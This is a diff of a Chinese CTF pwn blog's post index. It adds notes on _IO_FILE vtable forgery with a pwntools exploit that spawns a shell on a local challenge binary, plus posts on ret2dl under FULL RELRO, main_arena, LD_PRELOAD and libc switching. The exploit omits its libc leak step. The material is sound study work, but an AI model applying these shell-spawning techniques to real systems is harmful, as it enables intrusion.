&lt;_IO_file_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>
+<p>然后我们需要在它附近伪造一个vtable。</p>
+<ol>
+<li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>
+</ol>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br>p = process(<span class="hljs-string">&#x27;the_end&#x27;</span>)<br><br>libc_base = long(sleep_ad,<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&#x27;sleep&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0xf02b0</span><br>vtables =     libc_base + <span class="hljs-number">0x3C56F8</span><br><br>fake_vtable = libc_base + <span class="hljs-number">0x3c5588</span><br>target_addr = libc_base + <span class="hljs-number">0x3c55e0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    p.send(p64(vtables+i))<br>    p.send(p64(fake_vtable)[i])<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    p.send(p64(target_addr+i))<br>    p.send(p64(one_gadget)[i])<br><br>p.sendline(<span class="hljs-string">&quot;exec /bin/sh 1&gt;&amp;0&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
+<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
+<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>
+<p>这一个part我们学习FSOP。</p>
+<p>ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧///</p>
+<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项</p>
+]]></content>
+      <tags>
+        <tag>other</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>main_arena与多线程</title>
+    <url>/2021/08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
+    <content><![CDATA[<p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>
+<blockquote>
+<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>
+</blockquote>
+<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>
+<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>
+<h4 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>
+<h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>
+<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>
+<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>
+<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>
+<blockquote>
+<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>
+</blockquote>
+<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>
+<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/24909781">malloc x 线程</a></p>
+<p><a href="https://www.wangan.com/docs/1741">GLibcHeap</a></p>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>patch&#39;alarm</title>
+    <url>/2021/08/03/patch%20alarm/</url>
+    <content><![CDATA[<p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>
+<p>一般来说许多题都喜欢在main函数里加alarm。</p>
+<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>
+<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>
+<p>解决方案也比较弱智。就是直接patch掉就好了。</p>
+<p>ida都关了懒得上图了。</p>
+]]></content>
+      <tags>
+        <tag>mess</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2dl_advanced</title>
+    <url>/2021/08/02/ret2dl_advanced/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="ret2dl-advanced"><a href="#ret2dl-advanced" class="headerlink" title="ret2dl_advanced"></a>ret2dl_advanced</h2><h3 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>
+<p>但是我们仍然能够找到某种方式来getshell。</p>
+<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>
+<p>(Ps:为什么找不到相关的中文文章)</p>
+<h3 id="2）dt-dbg？"><a href="#2）dt-dbg？" class="headerlink" title="2）dt_dbg？"></a>2）dt_dbg？</h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>
+<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>
+<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>
+<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>
+<p><code>r_debug</code>具体代码如下:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_debug</span></span><br><span class="hljs-class">  &#123;</span> <br>    <span class="hljs-keyword">int</span> r_version;              <span class="hljs-comment">/* Version number for this protocol. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">r_map</span>;</span>     <span class="hljs-comment">/* Head of the chain of loaded objects. */</span><br><br>    <span class="hljs-comment">/* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */</span><br>    ElfW(Addr) r_brk;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">      &#123;</span> <br>        <span class="hljs-comment">/* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */</span><br>        RT_CONSISTENT,          <span class="hljs-comment">/* Mapping change is complete. */</span><br>        RT_ADD,                 <span class="hljs-comment">/* Beginning to add a new object. */</span><br>        RT_DELETE               <span class="hljs-comment">/* Beginning to remove an object mapping. */</span><br>      &#125; r_state;<br><br>    ElfW(Addr) r_ldbase;        <span class="hljs-comment">/* Base address the linker is loaded at. */</span><br>  &#125;;<br></code></pre></td></tr></table></figure>
+
+<p>实操一遍</p>
+<p>随便写一个无output的栈溢出。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fur1n@ubuntu:~/pwn$ readelf -d ret2dl<br><br>Dynamic section at offset 0xdb8 contains 27 entries:<br>  Tag        Type                         Name/Value<br>...<br> 0x0000000000000015 (DEBUG)              0x0<br><br><br></code></pre></td></tr></table></figure>
+
+<p>在没有运行的时候<code>dt_dbg</code>为空。</p>
+<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>
+<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>
+<p>段的地址。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/50gx 0x600e20<br>...<br>0x600ee0:	0x0000000000000015	0x00007ffff7ffe140<br></code></pre></td></tr></table></figure>
+
+<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe140<br>0x7ffff7ffe140 &lt;_r_debug&gt;:	0x0000000000000001	0x00007ffff7ffe170<br>0x7ffff7ffe150 &lt;_r_debug+16&gt;:	0x00007ffff7de3f40	0x0000000000000000<br>0x7ffff7ffe160 &lt;_r_debug+32&gt;:	0x00007ffff7dd3000	0x0000000000000000<br>0x7ffff7ffe170:	0x0000000000000000	0x00007ffff7ffe700<br>0x7ffff7ffe180:	0x0000000000600e20	0x00007ffff7ffe710<br>0x7ffff7ffe190:	0x0000000000000000	0x00007ffff7ffe170<br>0x7ffff7ffe1a0:	0x0000000000000000	0x00007ffff7ffe6e8<br>0x7ffff7ffe1b0:	0x0000000000000000	0x0000000000600e20<br>0x7ffff7ffe1c0:	0x0000000000600f00	0x0000000000600ef0<br>0x7ffff7ffe1d0:	0x0000000000000000	0x0000000000600ea0<br><br></code></pre></td></tr></table></figure>
+
+<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">0x7ffff7ffe140 &lt;_r_debug&gt;:	0x0000000000000001	0x00007ffff7ffe170<br></code></pre></td></tr></table></figure>
+
+<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>
+<p>虽然但是。</p>
+<p>只是找到<code>link_map</code>没啥用。</p>
+<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>
+<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>
+<p>那么如何寻找呢？</p>
+<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>
+<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>
+<p><code>dl_runtime_resolve</code>。</p>
+<p>首先我们找到<code>libc.so.6</code>文件。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/20gx 0x00007ffff7ffe170<br>0x7ffff7ffe170:	0x0000000000000000	0x00007ffff7ffe700<br>0x7ffff7ffe180:	0x0000000000600e20	0x00007ffff7ffe710<br>---<br>pwndbg&gt; x/20gx 0x00007ffff7ffe700<br>0x7ffff7ffe700:	0x0000000000000000	0x0000000000000000<br>0x7ffff7ffe710:	0x00007ffff7ffb000	0x00007ffff7ffebb0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffebb0<br>0x7ffff7ffebb0:	<span class="hljs-string">&quot;linux-vdso.so.1&quot;</span><br>---<br>pwndbg&gt; x/10gx 0x00007ffff7ffe710<br>0x7ffff7ffe710:	0x00007ffff7ffb000	0x00007ffff7ffebb0<br>0x7ffff7ffe720:	0x00007ffff7ffb3a0	0x00007ffff7fe2000<br>---<br>pwndbg&gt; x/10gx 0x00007ffff7fe2000<br>0x7ffff7fe2000:	0x00007ffff79e2000	0x00007ffff7ffedd0<br>---<br>pwndbg&gt; x/s 0x00007ffff7ffedd0<br>0x7ffff7ffedd0:	<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>即<code>0x00007ffff7ffedd0</code>。</p>
+<p>0x3即<code>GOT[]</code>入口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/30gx 0x00007ffff7dccb80<br>...<br>0x7ffff7dccc30:	0x0000000000000003	0x00007ffff7dcd000<br><br></code></pre></td></tr></table></figure>
+
+<p>找到GOT[3]</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/5gx 0x00007ffff7dcd000<br>0x7ffff7dcd000:	0x00000000003eab80	0x00007ffff7fe2000<br>0x7ffff7dcd010:	0x00007ffff7dea8f0	0x00007ffff7b70a10<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; xinfo 0x00007ffff7dea8f0<br>Extended information <span class="hljs-keyword">for</span> virtual address 0x7ffff7dea8f0:<br><br>  Containing mapping:<br>    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so<br><br>  Offset information:<br>         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0<br>         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0<br><br> Containing ELF sections:<br>               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="3）exploitation"><a href="#3）exploitation" class="headerlink" title="3）exploitation"></a>3）exploitation</h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>
+<p>有aslr的情况。。</p>
+<p>我也不会。</p>
+<h3 id="4-refrence"><a href="#4-refrence" class="headerlink" title="4)refrence"></a>4)refrence</h3><p><a href="http://rk700.github.io/2015/04/09/dt_debug-read/">通过DT_DEBUG来获得各个库的基址</a></p>
+<p><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico">How the ELF Ruined Christmas</a></p>
+<p><a href="https://ypl.coffee/dl-resolve-full-relro/">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>
+<p>————————————————tbc——————————————————-</p>
+]]></content>
+      <tags>
+        <tag>stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>roputils使用tips</title>
+    <url>/2021/08/03/roputils/</url>
+    <content><![CDATA[<p>做ret2dl的时候难免会偷懒使用工具。</p>
+<p>但是这个工具并没有看起来那么和善。</p>
+<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>
+<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>
+<p>所以解决方式有2</p>
+<ol>
+<li> 将roputils转换为py3</li>
+<li>ubuntu切换py版本</li>
+</ol>
+<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>
+<p>具体参数可以google。</p>
+<p>然后又来了第三个问题。</p>
+<p>来看我的报错。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">[+] Starting local process <span class="hljs-string">&#x27;./babystack&#x27;</span>: pid <span class="hljs-number">745</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;babystack.py&quot;</span>, line <span class="hljs-number">23</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    rop = roputils.ROP(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">440</span>, <span class="hljs-keyword">in</span> __init__<br>    ELF.__init__(self, *args, **kwargs)<br>  File <span class="hljs-string">&quot;/home/fur1n/pwn/week1/roputils.py&quot;</span>, line <span class="hljs-number">85</span>, <span class="hljs-keyword">in</span> __init__<br>    m = re.search(<span class="hljs-string">r&#x27;^\s*(?P&lt;key&gt;[^:]+):\s+(?P&lt;value&gt;.+)$&#x27;</span>, line)<br>  File <span class="hljs-string">&quot;/usr/lib/python3.6/re.py&quot;</span>, line <span class="hljs-number">182</span>, <span class="hljs-keyword">in</span> search<br>    <span class="hljs-keyword">return</span> _<span class="hljs-built_in">compile</span>(pattern, flags).search(string)<br>TypeError: cannot use a string pattern on a <span class="hljs-built_in">bytes</span>-like <span class="hljs-built_in">object</span><br></code></pre></td></tr></table></figure>
+
+<p>这个功能好像并不会在byte前加b。。。</p>
+<p>目前来说并没有发现解决方法。</p>
+<p>所以只能尝试更换默认的py版本。具体可以google</p>
+]]></content>
+      <tags>
+        <tag>mess</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu加载不同版本libc</title>
+    <url>/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/</url>
+    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id="1）review"><a href="#1）review" class="headerlink" title="1）review"></a>1）review</h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>
+<p>然后我就是这样一步一步地变得不会调试的。</p>
+<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>
+<p>呜呜呜，我居然一直忽略了它的灵魂</p>
+<p>所以这一次我一定要解决掉这个问题。</p>
+<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>
+<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>
+<h4 id="2）原理"><a href="#2）原理" class="headerlink" title="2）原理"></a>2）原理</h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>
+<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>
+<h5 id="1）LD-PRELOAD"><a href="#1）LD-PRELOAD" class="headerlink" title="1）LD_PRELOAD"></a>1）LD_PRELOAD</h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;</code></p>
+<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>
+<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
+<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>
+<h5 id="2）LD-LIBRARY-PATH和LIBRARY-PATH"><a href="#2）LD-LIBRARY-PATH和LIBRARY-PATH" class="headerlink" title="2）LD_LIBRARY_PATH和LIBRARY_PATH"></a>2）LD_LIBRARY_PATH和LIBRARY_PATH</h5><p>LD_LIBRARY_PATH用于在<em><strong>程序加载运行期间</strong></em>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>
+<p>LIBRARY_PATH环境变量用于在<em><strong>程序编译期间</strong></em>查找动态链接库时指定查找共享库的路径</p>
+<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>
+<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>
+<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>
+<h5 id="1）-PT-INTERP"><a href="#1）-PT-INTERP" class="headerlink" title="1） PT_INTERP"></a>1） PT_INTERP</h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>
+<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>
+<h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>
+<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>
+<h4 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h4><p>我们以lonelywolf为例。</p>
+<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/net66/p/5609026.html"><a href="https://www.cnblogs.com/net66/p/5609026.html">LD_PRELOAD的偷梁换柱之能</a></a></p>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>调试器断点原理</title>
+    <url>/2021/08/10/%E8%B0%83%E8%AF%95%E5%99%A8%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<h2 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h2><p>夹带私货的科普文</p>
+<h3 id="2）调试器断点"><a href="#2）调试器断点" class="headerlink" title="2）调试器断点"></a>2）调试器断点</h3><p>　　调试器可以给程序打断点是怎么回事呢？调试器相信大家都很熟悉，但是调试器可以给程序打断点是怎么回事呢，下面就让小编带大家一起了解吧。<br>　　调试器可以给程序打断点，其实就是程序以为自己出错了，大家可能会很惊讶程序怎么可能以为自己会出错呢？但事实就是这样，小编也感到非常惊讶。<br>　　这就是关于调试器可以给程序打断点的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！</p>
+]]></content>
+      <tags>
+        <tag>mess</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SummerTask</title>
     <url>/2021/08/02/summertask/</url>
     <content><![CDATA[<h1 id="1）Summer-Havard"><a href="#1）Summer-Havard" class="headerlink" title="1）Summer_Havard"></a>1）Summer_Havard</h1><h2 id="1-考点"><a href="#1-考点" class="headerlink" title="1) 考点"></a>1) 考点</h2><p>unlink</p>
@@ -264,365 +618,6 @@
 ]]></content>
       <tags>
         <tag>mess</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ret2dl_advanced</title>
-    <url>/2021/08/02/ret2dl_advanced/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="ret2dl-advanced"><a href="#ret2dl-advanced" class="headerlink" title="ret2dl_advanced"></a>ret2dl_advanced</h2><h3 id="1-review"><a href="#1-review" class="headerlink" title="1)review"></a>1)review</h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>
-<p>但是我们仍然能够找到某种方式来getshell。</p>
-<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>
-<p>(Ps:为什么找不到相关的中文文章)</p>
-<h3 id="2）dt-dbg？"><a href="#2）dt-dbg？" class="headerlink" title="2）dt_dbg？"></a>2）dt_dbg？</h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>
-<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>
-<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>
-<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>
-<p><code>r_debug</code>具体代码如下:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_debug</span></span><br><span class="hljs-class">  &#123;</span> <br>    <span class="hljs-keyword">int</span> r_version;              <span class="hljs-comment">/* Version number for this protocol. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">r_map</span>;</span>     <span class="hljs-comment">/* Head of the chain of loaded objects. */</span><br><br>    <span class="hljs-comment">/* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */</span><br>    ElfW(Addr) r_brk;<br>    <span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">      &#123;</span> <br>        <span class="hljs-comment">/* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */</span><br>        RT_CONSISTENT,          <span class="hljs-comment">/* Mapping change is complete. */</span><br>        RT_ADD,                 <span class="hljs-comment">/* Beginning to add a new object. */</span><br>        RT_DELETE               <span class="hljs-comment">/* Beginning to remove an object mapping. */</span><br>      &#125; r_state;<br><br>    ElfW(Addr) r_ldbase;        <span class="hljs-comment">/* Base address the linker is loaded at. */</span><br>  &#125;;<br></code></pre></td></tr></table></figure>
-
-<p>实操一遍</p>
-<p>随便写一个无output的栈溢出。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fur1n@ubuntu:~/pwn$ readelf -d ret2dl<br><br>Dynamic section at offset 0xdb8 contains 27 entries:<br>  Tag        Type                         Name/Value<br>...<br> 0x0000000000000015 (DEBUG)              0x0<br><br><br></code></pre></td></tr></table></figure>
-
-<p>在没有运行的时候<code>dt_dbg</code>为空。</p>
-<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>
-<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>
-<p>段的地址。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/50gx 0x600e20<br>...<br>0x600ee0:	0x0000000000000015	0x00007ffff7ffe140<br></code></pre></td></tr></table></figure>
-
-<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>
